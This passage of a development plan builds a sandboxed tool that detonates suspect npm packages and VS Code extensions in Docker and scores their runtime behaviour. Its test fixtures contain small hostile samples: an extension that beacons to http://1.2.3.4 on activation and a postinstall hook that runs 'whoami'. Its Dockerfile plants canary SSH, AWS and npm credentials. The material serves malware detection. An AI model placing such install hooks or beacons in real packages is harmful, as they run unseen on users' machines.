    assert cats["process-exec"] == Severity.HIGH
    assert cats["network"] == Severity.HIGH
    assert cats["secret-access"] == Severity.HIGH
    assert cats["obfuscation"] == Severity.MEDIUM
    assert all(f.location == "[dynamic]" for f in findings)


def test_dedupes_repeated_behavior():
    events = [BehaviorEvent(kind="process", detail="exec: whoami")] * 3
    findings = behavior_to_findings(events)
    assert len(findings) == 1


def test_no_events_no_findings():
    assert behavior_to_findings([]) == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_sandbox_findings.py -v`
Expected: FAIL — module missing.

- [ ] **Step 3: Write implementation**

```python
# src/npm_ide_analyst/sandbox/findings.py
from __future__ import annotations

from ..models import BehaviorEvent, Finding, Severity

# kind -> (category, severity, title)
_MAP = {
    "process": ("process-exec", Severity.HIGH, "Runtime process execution"),
    "network": ("network", Severity.HIGH, "Runtime outbound network"),
    "secret": ("secret-access", Severity.HIGH, "Runtime secret/credential access"),
    "eval": ("dynamic-code", Severity.HIGH, "Runtime dynamic code execution"),
    "decode": ("obfuscation", Severity.MEDIUM, "Runtime payload decoding"),
    "dns": ("network", Severity.LOW, "Runtime DNS lookup"),
    "vscode": ("extension-behavior", Severity.MEDIUM, "Editor API use during activation"),
    "file": ("file-write", Severity.LOW, "Runtime file write"),
}


def behavior_to_findings(events: list[BehaviorEvent]) -> list[Finding]:
    seen: dict[tuple[str, str], Finding] = {}
    for ev in events:
        mapping = _MAP.get(ev.kind)
        if mapping is None:
            continue
        category, severity, title = mapping
        key = (category, ev.detail)
        if key in seen:
            continue
        seen[key] = Finding(
            id=f"DYN-{category}-{len(seen)}",
            title=title,
            severity=severity,
            category=category,
            detail=f"{title} (observed during detonation): {ev.detail}",
            location="[dynamic]",
            evidence=ev.detail,
        )
    return list(seen.values())
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_sandbox_findings.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/sandbox/findings.py tests/test_sandbox_findings.py
git commit -m "feat: derive scored Findings from runtime behavior"
```

---

### Task 6: Docker image + orchestrator

**Files:**
- Create: `src/npm_ide_analyst/sandbox/docker/Dockerfile`
- Create: `src/npm_ide_analyst/sandbox/orchestrator.py`
- Test: `tests/test_sandbox_orchestrator.py` (gated on docker)

**Interfaces:**
- Consumes: `load_event_log` (Task 4), `behavior_to_findings` (Task 5), `BehaviorEvent`, `ArtifactType`.
- Produces:
  - `def docker_available() -> bool`.
  - `IMAGE_TAG = "npm-ide-analyst-sandbox:latest"`.
  - `def build_image() -> None` — `docker build` the harness image (idempotent).
  - `def detonate(payload_root: Path, artifact_type: ArtifactType, timeout: int = 30) -> list[BehaviorEvent]` — runs the hardened container, mounting `payload_root` read-only at `/work/sample`, an output tmp dir for the event log, sets `ANALYST_SAMPLE_DIR`/`ANALYST_EVENT_LOG`, picks `run-vsix.js` vs `run-npm.js` by artifact type, enforces all isolation flags from Global Constraints, waits up to `timeout`, then parses the event log. Raises `SandboxUnavailable` if Docker is missing.

The exact `docker run` argument vector (all isolation flags mandatory):

```python
DOCKER_RUN_FLAGS = [
    "--rm",
    "--network", "none",
    "--user", "1000:1000",
    "--cap-drop", "ALL",
    "--security-opt", "no-new-privileges",
    "--read-only",
    "--tmpfs", "/work/out:rw,size=16m",
    "--tmpfs", "/tmp:rw,size=16m",
    "--memory", "256m",
    "--cpus", "1",
    "--pids-limit", "128",
]
```

- [ ] **Step 1: Write the Dockerfile**

```dockerfile
# src/npm_ide_analyst/sandbox/docker/Dockerfile
FROM node:22-bookworm-slim

# Non-root user for detonation
RUN useradd -m -u 1000 analyst || true

# Harness lives in the image (read-only rootfs at runtime)
WORKDIR /harness
COPY harness/ /harness/

# Canary/decoy secrets so theft is observable and traceable
RUN mkdir -p /home/analyst/.ssh /home/analyst/.aws \
 && echo "-----BEGIN OPENSSH PRIVATE KEY-----\nCANARY-DO-NOT-USE\n-----END OPENSSH PRIVATE KEY-----" > /home/analyst/.ssh/id_rsa \
 && echo "[default]\naws_access_key_id=CANARYAKIA000000\naws_secret_access_key=canary000000" > /home/analyst/.aws/credentials \
 && echo "//registry.npmjs.org/:_authToken=CANARY-NPM-TOKEN" > /home/analyst/.npmrc \
 && chown -R 1000:1000 /home/analyst

USER 1000:1000
ENV ANALYST_EVENT_LOG=/work/out/events.jsonl
# Entry is chosen at run time via command args (run-npm.js or run-vsix.js)
ENTRYPOINT ["node", "-r", "/harness/preload.js"]
```

- [ ] **Step 2: Write the failing test**

```python
# tests/test_sandbox_orchestrator.py
import json
from pathlib import Path

import pytest

from npm_ide_analyst.models import ArtifactType
from npm_ide_analyst.sandbox import orchestrator as orch

pytestmark = pytest.mark.skipif(not orch.docker_available(), reason="docker not available")


@pytest.fixture(scope="module", autouse=True)
def _image():
    orch.build_image()


def test_detonate_vsix_captures_network(tmp_path):
    sample = tmp_path / "ext"
    sample.mkdir()
    (sample / "package.json").write_text(json.dumps({"name": "e", "main": "./extension.js"}))
    (sample / "extension.js").write_text(
        "exports.activate=()=>{require('http').get('http://1.2.3.4/beacon');};",
        encoding="utf-8")
    events = orch.detonate(sample, ArtifactType.EXTENSION, timeout=60)
    assert any(e.kind == "network" and "1.2.3.4" in e.detail for e in events)


def test_detonate_npm_captures_process(tmp_path):
    sample = tmp_path / "pkg"
    sample.mkdir()
    (sample / "package.json").write_text(json.dumps(
        {"name": "p", "scripts": {"postinstall": "node ./evil.js"}}))
    (sample / "evil.js").write_text("require('child_process').exec('whoami');", encoding="utf-8")
    events = orch.detonate(sample, ArtifactType.NPM, timeout=60)
    assert any(e.kind == "process" and "whoami" in e.detail for e in events)
```

- [ ] **Step 3: Run test to verify it fails**

Run: `python -m pytest tests/test_sandbox_orchestrator.py -v`
Expected: FAIL — `orchestrator` module missing (or skip if docker absent).

- [ ] **Step 4: Write orchestrator.py**

```python
# src/npm_ide_analyst/sandbox/orchestrator.py
from __future__ import annotations

import shutil
import subprocess
import tempfile
from pathlib import Path

from ..models import ArtifactType, BehaviorEvent
from .events import load_event_log

IMAGE_TAG = "npm-ide-analyst-sandbox:latest"
_DOCKER_DIR = Path(__file__).parent / "docker"
_HARNESS_DIR = Path(__file__).parent / "harness"

DOCKER_RUN_FLAGS = [
    "--rm",
    "--network", "none",
    "--user", "1000:1000",
    "--cap-drop", "ALL",
    "--security-opt", "no-new-privileges",
    "--read-only",
    "--tmpfs", "/work/out:rw,size=16m",
    "--tmpfs", "/tmp:rw,size=16m",
    "--memory", "256m",
    "--cpus", "1",
    "--pids-limit", "128",
]


class SandboxUnavailable(RuntimeError):
    pass


def docker_available() -> bool:
    if shutil.which("docker") is None:
        return False
    try:
        r = subprocess.run(["docker", "info"], capture_output=True, timeout=15)
        return r.returncode == 0
    except (subprocess.SubprocessError, OSError):
        return False


def build_image() -> None:
    if not docker_available():
        raise SandboxUnavailable("docker is not available")
    # Build context is the sandbox dir so the Dockerfile can COPY harness/.
    ctx = Path(__file__).parent
    subprocess.run(
        ["docker", "build", "-f", str(_DOCKER_DIR / "Dockerfile"),
         "-t", IMAGE_TAG, str(ctx)],
        check=True, capture_output=True, timeout=600,
    )


def detonate(payload_root: Path, artifact_type: ArtifactType,
             timeout: int = 30) -> list[BehaviorEvent]:
    if not docker_available():
        raise SandboxUnavailable("docker is not available")
    runner = "run-vsix.js" if artifact_type == ArtifactType.EXTENSION else "run-npm.js"
    out_dir = Path(tempfile.mkdtemp(prefix="analyst-out-"))
    try:
        cmd = [
            "docker", "run",
            *DOCKER_RUN_FLAGS,
            "-v", f"{payload_root.resolve()}:/work/sample:ro",
            "-v", f"{out_dir.resolve()}:/work/hostout:rw",
            "-e", "ANALYST_SAMPLE_DIR=/work/sample",
            "-e", "ANALYST_EVENT_LOG=/work/hostout/events.jsonl",
            IMAGE_TAG,
            f"/harness/{runner}",
        ]
        try:
            subprocess.run(cmd, capture_output=True, timeout=timeout + 15)
        except subprocess.TimeoutExpired:
            pass  # container is killed by --rm on timeout; partial log still ingested
        return load_event_log(out_dir / "events.jsonl")
    finally:
        shutil.rmtree(out_dir, ignore_errors=True)
```

> Note: the event log is written to a bind-mounted host tmp dir (`/work/hostout`),
> not the read-only rootfs — that is why `-v ...hostout:rw` is present alongside
> `--read-only`. The sample mount stays `:ro`.

- [ ] **Step 5: Run tests to verify they pass**

Run: `python -m pytest tests/test_sandbox_orchestrator.py -v`
Expected: PASS on a machine with Docker (first run builds the image; allow time), or skip cleanly if Docker is absent.

- [ ] **Step 6: Commit**

```bash
git add src/npm_ide_analyst/sandbox/docker/Dockerfile src/npm_ide_analyst/sandbox/orchestrator.py tests/test_sandbox_orchestrator.py
git commit -m "feat: hardened Docker detonation orchestrator"
```

---

### Task 7: Timeline correlation

**Files:**
- Create: `src/npm_ide_analyst/correlate/__init__.py` (empty)
- Create: `src/npm_ide_analyst/correlate/timeline.py`
- Test: `tests/test_timeline.py`

**Interfaces:**
- Consumes: `BehaviorEvent`, `TimelineEntry` (Task 1).
- Produces:
  - `def build_timeline(behavior: list[BehaviorEvent], evidence_dir: Path | None = None) -> list[TimelineEntry]` — creates one `TimelineEntry` per behavior event (source `detonation`, ts = formatted ms) in order; if `evidence_dir` is given, additionally scans any `*.log` under it for lines containing `install`/`activat` and adds entries (source `evidence-log`), then returns the list sorted by (source priority, original order) with detonation events kept in emission order. Missing/empty inputs yield `[]`.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_timeline.py
from pathlib import Path
from npm_ide_analyst.models import BehaviorEvent
from npm_ide_analyst.correlate.timeline import build_timeline


def test_timeline_from_behavior_events():
    behavior = [
        BehaviorEvent(kind="detonation", detail="activate() called", ts=1.0),
        BehaviorEvent(kind="network", detail="http request: http://1.2.3.4", ts=2.0),
    ]
    tl = build_timeline(behavior)
    assert len(tl) == 2
    assert tl[0].source == "detonation"
    assert "activate" in tl[0].event


def test_timeline_includes_evidence_logs(tmp_path):
    (tmp_path / "exthost.log").write_text(
        "2026-07-06 10:00:00 activating extension evil.ext\n"
        "unrelated line\n", encoding="utf-8")
    behavior = [BehaviorEvent(kind="network", detail="beacon", ts=1.0)]
    tl = build_timeline(behavior, evidence_dir=tmp_path)
    sources = {e.source for e in tl}
    assert "evidence-log" in sources
    assert "detonation" in sources


def test_empty_inputs():
    assert build_timeline([]) == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_timeline.py -v`
Expected: FAIL — module missing.

- [ ] **Step 3: Write implementation**

```python
# src/npm_ide_analyst/correlate/timeline.py
from __future__ import annotations

import re
from pathlib import Path

from ..models import BehaviorEvent, TimelineEntry

_EVIDENCE_PAT = re.compile(r"install|activat", re.IGNORECASE)


def build_timeline(behavior: list[BehaviorEvent],
                   evidence_dir: Path | None = None) -> list[TimelineEntry]:
    entries: list[TimelineEntry] = []
    for ev in behavior:
        ts = f"{ev.ts:.1f}ms" if ev.ts is not None else "-"
        entries.append(TimelineEntry(ts=ts, source="detonation",
                                     event=f"[{ev.kind}] {ev.detail}"))
    if evidence_dir is not None and evidence_dir.exists():
        for log in sorted(evidence_dir.rglob("*.log")):
            if not log.is_file():
                continue
            for line in log.read_text(encoding="utf-8", errors="replace").splitlines():
                if _EVIDENCE_PAT.search(line):
                    entries.append(TimelineEntry(
                        ts="-", source="evidence-log",
                        event=f"{log.name}: {line.strip()[:200]}"))
    return entries
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_timeline.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/correlate/__init__.py src/npm_ide_analyst/correlate/timeline.py tests/test_timeline.py
git commit -m "feat: timeline correlation (detonation events + evidence logs)"
```

---

### Task 8: CLI wiring — `--dynamic` and `report` subcommand

**Files:**
- Modify: `src/npm_ide_analyst/cli.py`
- Test: `tests/test_cli_dynamic.py` (unit part ungated; detonation part gated on docker)

**Interfaces:**
- Consumes: `detonate`/`docker_available`/`build_image`/`SandboxUnavailable` (Task 6), `behavior_to_findings` (Task 5), `build_timeline` (Task 7), `report_to_dict` (Plan A), `write_json`/`write_html`.
- Produces:
  - `analyze` gains `--dynamic/--no-dynamic` (default off). When `--dynamic`: after static analysis, call `detonate(payload_root, sample.artifact_type)`, append `behavior_to_findings(events)` to findings, set `report.behavior = events`, set `report.timeline = build_timeline(events)`. If Docker is unavailable, print a clear warning and continue with static-only (exit 0).
  - New `report` subcommand: `report JSON_PATH --out HTML_PATH` — loads a prior `report.json` and re-renders HTML via a `dict_to_report`-free path (render directly from the dict using the same template). Add `def _render_html_from_dict(data: dict, out_path: Path)` in `report/html_report.py` OR reconstruct a `Report`; the plan chooses reconstructing minimal objects. Implement `load_report(path) -> Report` in `report/json_report.py`.

- [ ] **Step 1: Write `load_report` first (failing test)**

```python
# tests/test_cli_dynamic.py
import json
from pathlib import Path
from click.testing import CliRunner
from npm_ide_analyst.cli import cli
from npm_ide_analyst.report.json_report import load_report, write_json
from npm_ide_analyst.models import Report, Sample, Finding, Severity, ArtifactType, BehaviorEvent


def _report():
    s = Sample(name="evil", version="1.0.0", artifact_type=ArtifactType.EXTENSION,
               root=Path("/tmp/x"), sha256="a" * 64, sha512="b" * 128)
    return Report(sample=s,
                  findings=[Finding(id="D1", title="beacon", severity=Severity.HIGH,
                                    category="network", detail="POST 1.2.3.4")],
                  generated_at="t",
                  behavior=[BehaviorEvent(kind="network", detail="beacon")])


def test_load_report_roundtrip(tmp_path):
    p = tmp_path / "report.json"
    write_json(_report(), p)
    r = load_report(p)
    assert r.sample.name == "evil"
    assert r.findings[0].severity == Severity.HIGH
    assert r.behavior[0].kind == "network"


def test_report_subcommand_rerenders_html(tmp_path):
    p = tmp_path / "report.json"
    write_json(_report(), p)
    out = tmp_path / "report.html"
    result = CliRunner().invoke(cli, ["report", str(p), "--out", str(out)])
    assert result.exit_code == 0, result.output
    assert "beacon" in out.read_text(encoding="utf-8")


def test_analyze_static_only_when_no_dynamic(tmp_path):
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "package.json").write_text(json.dumps(
        {"name": "evil", "scripts": {"postinstall": "node ./s.js"}}))
    (pkg / "s.js").write_text("require('child_process')", encoding="utf-8")
    out = tmp_path / "out"
    result = CliRunner().invoke(cli, ["analyze", str(pkg), "--out", str(out)])
    assert result.exit_code == 0
    data = json.loads((out / "report.json").read_text())
    assert data["behavior"] == []          # no dynamic requested
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_cli_dynamic.py -v`
Expected: FAIL — `load_report` missing / `report` subcommand missing.

- [ ] **Step 3: Add `load_report` to json_report.py**

```python
# append to src/npm_ide_analyst/report/json_report.py
from pathlib import Path
from ..models import (
    Report, Sample, Finding, Severity, ArtifactType, BehaviorEvent, TimelineEntry,
)


def load_report(path: Path) -> Report:
    data = json.loads(path.read_text(encoding="utf-8"))
    s = data["sample"]
    sample = Sample(
        name=s["name"], version=s.get("version"),
        artifact_type=ArtifactType(s["artifact_type"]),
        root=Path(s["root"]), sha256=s["sha256"], sha512=s["sha512"],
    )
    findings = [
        Finding(id=f["id"], title=f["title"], severity=Severity(f["severity"]),
                category=f["category"], detail=f["detail"],
                location=f.get("location"), evidence=f.get("evidence"))
        for f in data.get("findings", [])
    ]
    behavior = [
        BehaviorEvent(kind=b["kind"], detail=b["detail"], data=b.get("data") or {},
                      ts=b.get("ts"), stack=b.get("stack"))
        for b in data.get("behavior", [])
    ]
    timeline = [
        TimelineEntry(ts=t["ts"], source=t["source"], event=t["event"])
        for t in data.get("timeline", [])
    ]
    return Report(sample=sample, findings=findings,
                  generated_at=data.get("generated_at", ""),
                  behavior=behavior, timeline=timeline)
```

- [ ] **Step 4: Wire the CLI**

In `src/npm_ide_analyst/cli.py`, add imports and update `analyze`, add `report`:

```python
# add to imports
from .sandbox.orchestrator import detonate, docker_available, build_image, SandboxUnavailable
from .sandbox.findings import behavior_to_findings
from .correlate.timeline import build_timeline
from .report.json_report import load_report
from .report.html_report import write_html
```

Add the `--dynamic` option to `analyze` (add the decorator and the block after `findings = run_static(payload_root)`):

```python
@click.option("--dynamic/--no-dynamic", default=False,
              help="Detonate the sample in a hardened Docker sandbox.")
# ... existing analyze signature gains `dynamic: bool`

    # after: findings = run_static(payload_root)
    behavior = []
    timeline = []
    if dynamic:
        if not docker_available():
            click.echo("WARNING: --dynamic requested but Docker is unavailable; "
                       "running static-only.", err=True)
        else:
            build_image()
            behavior = detonate(payload_root, sample.artifact_type)
            findings = findings + behavior_to_findings(behavior)
            timeline = build_timeline(behavior)
    report = Report(sample=sample, findings=findings, generated_at=_now(),
                    behavior=behavior, timeline=timeline)
```

Add the `report` subcommand:

```python
@cli.command(name="report")
@click.argument("json_path", type=click.Path(exists=True, path_type=Path))
@click.option("--out", "out_path", required=True, type=click.Path(path_type=Path))
def report_cmd(json_path: Path, out_path: Path) -> None:
    """Re-render HTML from a saved report.json."""
    rpt = load_report(json_path)
    write_html(rpt, out_path)
    click.echo(f"rendered {out_path}")
```

- [ ] **Step 5: Run tests + full suite**

Run: `python -m pytest tests/test_cli_dynamic.py -v && python -m pytest -q`
Expected: ungated tests PASS; full suite green; docker-gated detonation test skips when Docker absent.

- [ ] **Step 6: Verify the CLI end to end (manual, gated on Docker)**

Run (only if Docker present):
`npm-ide-analyst analyze <path-to-sample> --out ./out --dynamic`
Expected: `out/report.json` has a non-empty `behavior` array and dynamic findings; `out/report.html` shows a "Dynamic Behavior" section.

- [ ] **Step 7: Commit**

```bash
git add src/npm_ide_analyst/cli.py src/npm_ide_analyst/report/json_report.py tests/test_cli_dynamic.py
git commit -m "feat: --dynamic detonation flag + report re-render subcommand"
```

---

## Self-Review (completed during authoring)

- **Spec coverage:** dynamic detonation (spec §4.3) → Tasks 2,3,6; sinkhole/fakenet → realized in-harness (Task 2 network hooks) + `--network none` (Task 6), deviation flagged in §"Design refinement"; canary secrets → Task 6 Dockerfile; behavior→report → Tasks 1,4,5; timeline (spec §4.4) → Task 7; `analyze --dynamic` and `report` subcommand → Task 8. Isolation invariants (spec §6) → Task 6 `DOCKER_RUN_FLAGS`.
- **Placeholder scan:** none — every step carries complete code.
- **Type consistency:** `BehaviorEvent`/`TimelineEntry` fields and `parse_event_log`/`behavior_to_findings`/`build_timeline`/`detonate`/`load_report` signatures are used identically across tasks and match Plan A's `Report`/`Finding`/`Sample`/`report_to_dict`.
- **Safety invariant:** Python never executes sample code — detonation is `subprocess` → `docker` only (Task 6); harness unit tests (Tasks 2,3) run trusted test-authored drivers under neutering hooks, never untrusted samples; `load_report` parses JSON only.
- **Gating:** every Docker/Node test is skipped cleanly when the tool is absent; the entire unit layer (Tasks 1,4,5,7 and the ungated parts of 8) runs with neither installed.

## Out of scope (future work)
- A real DNS+HTTP **sinkhole container** for live multi-round C2 dialog capture (this plan uses in-harness fakenet + `--network none`).
- Native-binary tracing: strace syscall tracing implemented (opt-in `--trace-native`, see `docs/superpowers/specs/2026-07-07-native-syscall-tracing-design.md`). Frida/API-level tracing remains future work.
- Windows-container detonation.
- `filter="data"` on tar extraction (Plan A follow-up) and other Plan A minor backlog.
